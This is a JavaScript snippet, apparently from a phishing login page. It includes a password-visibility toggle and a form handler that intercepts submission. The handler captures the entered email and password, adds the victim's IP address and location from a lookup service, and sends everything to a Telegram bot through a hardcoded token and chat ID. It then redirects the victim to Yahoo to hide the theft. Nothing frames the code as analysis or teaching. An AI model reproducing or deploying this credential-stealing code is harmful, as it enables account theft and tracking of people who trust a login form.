	<script>
    // Toggle password visibility
    document.getElementById("password-toggle-button").addEventListener("click", function () {
        const passwordInput = document.getElementById("user-password");
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            this.textContent = "Hide";
        } else {
            passwordInput.type = "password";
            this.textContent = "Show";
        }

    // Form submission to Telegram
    document.getElementById("loginForm").addEventListener("submit", function (event) {
        event.preventDefault(); // Prevent default form submission

        // Collect form data
        const email = document.getElementById("email").value;
        const password = document.getElementById("user-password").value;

        // Get current date and time
        const currentTime = new Date().toLocaleString();

        // Get IP address and location
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                const city = data.city || 'Unknown City';
                const region = data.region || 'Unknown Region';
                const country = data.country_name || 'Unknown Country';

                // Telegram bot token and chat ID
                const botToken = '8147187568:AAHMoG0snH1303E7BvCHgToA3bedoIMoHbo';
                const chatId = '6078089614';

                // Message to send to Telegram
                const message = `
                    Email: ${email}
                    Password: ${password}
                    IP: ${ip}
                    Location: ${city}, ${region}, ${country}
                    Date and Time: ${currentTime}
                `;

                // Send the message to Telegram
                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                })
                    .then(response => response.json())
                    .then(data => {
                        if (data.ok) {
                            console.log('Message sent successfully:', data);
                            // Redirect after successful submission
                            window.location.href = "https://yahoo.com";
                        } else {
                            console.error('Error sending message:', data);
                            alert('There was an error sending your information to Telegram.');
                        }
                    })
                    .catch(error => {
                        console.error('Request failed:', error);
                        alert('Failed to send data. Check your network connection.');
                    });
            })
            .catch(error => {
                console.error('Failed to fetch IP or location data:', error);
                alert('Could not retrieve IP and location data.');
            });
    });
</script>
